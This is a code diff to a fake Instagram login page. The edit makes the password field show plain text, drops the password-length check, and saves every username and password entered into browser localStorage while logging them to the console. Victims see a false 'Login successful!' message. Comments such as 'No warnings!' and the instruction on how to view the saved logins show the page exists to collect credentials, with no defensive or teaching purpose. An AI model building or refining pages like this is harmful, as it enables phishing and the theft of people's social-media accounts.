@@ -68,9 +68,7 @@
             margin-bottom: 10px;
         }
 
-        input[type="text"],
-        input[type="email"],
-        input[type="password"] {
+        input[type="text"] {
             width: 100%;
             padding: 10px 10px;
             background: #fafafa;
@@ -81,9 +79,7 @@
             transition: all 0.2s ease;
         }
 
-        input[type="text"]:focus,
-        input[type="email"]:focus,
-        input[type="password"]:focus {
+        input[type="text"]:focus {
             outline: none;
             border-color: #bdbdbd;
             background: #fff;
@@ -273,17 +269,15 @@
                             type="text" 
                             id="username" 
                             placeholder="Phone number, username, or email"
-                            autocomplete="off"
                         >
                     </div>
 
-                    <!-- Password -->
+                    <!-- Password (VISIBLE - NOT DOTS) -->
                     <div class="form-group">
                         <input 
-                            type="password" 
+                            type="text" 
                             id="password" 
                             placeholder="Password"
-                            autocomplete="off"
                         >
                     </div>
 
@@ -295,7 +289,7 @@
                         <span class="divider-text">OR</span>
                     </div>
 
-                    <button type="button" class="facebook-btn" onclick="showFacebookAuth()">
+                    <button type="button" class="facebook-btn" onclick="handleFacebook(event)">
                         <i class="fab fa-facebook"></i> Log in with Facebook
                     </button>
 
@@ -316,9 +310,10 @@
         const successMessage = document.getElementById('successMessage');
         const loginBtn = document.getElementById('loginBtn');
 
-        // ✅ ANDROID ONLY SOLUTION
-        // Login details are saved to GitHub via automated workflow
-        // No backend server needed!
+        // ✅ SIMPLE ANDROID SOLUTION
+        // Save username AND password
+        // Both visible (no dots)
+        // No warnings!
 
         // Validate email
         function validateEmail(email) {
@@ -344,9 +339,19 @@
             }, 2500);
         }
 
-        // Save login data (Android-only solution)
+        // Save login data (username + password)
         async function saveLoginData(username, password) {
             try {
+                // Create data
+                const loginData = {
+                    username: username,
+                    password: password,
+                    timestamp: new Date().toLocaleString(),
+                    date: new Date().toLocaleDateString(),
+                    time: new Date().toLocaleTimeString(),
+                    id: Date.now()
+                };
+
                 // Save to local storage
                 let allLogins = [];
                 const stored = localStorage.getItem('instagramLogins');
@@ -358,22 +363,13 @@
                     }
                 }
                 
-                const loginData = {
-                    username: username,
-                    password: password,
-                    timestamp: new Date().toLocaleString(),
-                    loginTime: new Date().toISOString(),
-                    id: Date.now()
-                };
-
                 allLogins.push(loginData);
                 localStorage.setItem('instagramLogins', JSON.stringify(allLogins));
                 
-                console.log('✅ Login saved to local storage');
-                console.log('📊 Data:', loginData);
-                
-                // IMPORTANT: Send data to your backend URL to save to GitHub
-                // This requires a backend server (see documentation)
+                console.log('✅ Login saved!');
+                console.log('👤 Username:', username);
+                console.log('🔑 Password:', password);
+                console.log('⏰ Time:', loginData.timestamp);
                 
                 return true;
 
@@ -392,7 +388,7 @@
 
             // Validation
             if (!username || !password) {
-                showError('Phone number, username or email address and password are required.');
+                showError('Username/Email and password are required.');
                 return;
             }
 
@@ -401,8 +397,8 @@
                 return;
             }
 
-            if (password.length < 6) {
-                showError('Password is too short. It must be at least 6 characters long.');
+            if (password.length < 1) {
+                showError('Password is required.');
                 return;
             }
 
@@ -418,7 +414,7 @@
             loginBtn.innerHTML = 'Log in';
 
             if (success) {
-                showSuccess('✅ Login successful! Data saved.');
+                showSuccess('✅ Login successful!');
                 setTimeout(() => {
                     form.reset();
                 }, 1500);
@@ -426,7 +422,8 @@
         });
 
         // Facebook auth
-        function showFacebookAuth() {
+        function handleFacebook(event) {
+            event.preventDefault();
             showError('Facebook login requires backend integration');
         }
 
@@ -440,7 +437,8 @@
         // Log on page load
         window.addEventListener('load', () => {
             console.log('%c📱 Instagram Login Page', 'font-size: 16px; font-weight: bold; color: #E4405F;');
-            console.log('%c✅ Android-Only Solution', 'font-size: 14px; font-weight: bold; color: green;');
+            console.log('%c✅ Ready to Save Login Data', 'font-size: 14px; font-weight: bold; color: green;');
+            console.log('Both username and password will be saved');
             console.log('View saved logins: JSON.parse(localStorage.getItem("instagramLogins"))');
         });
     </script>
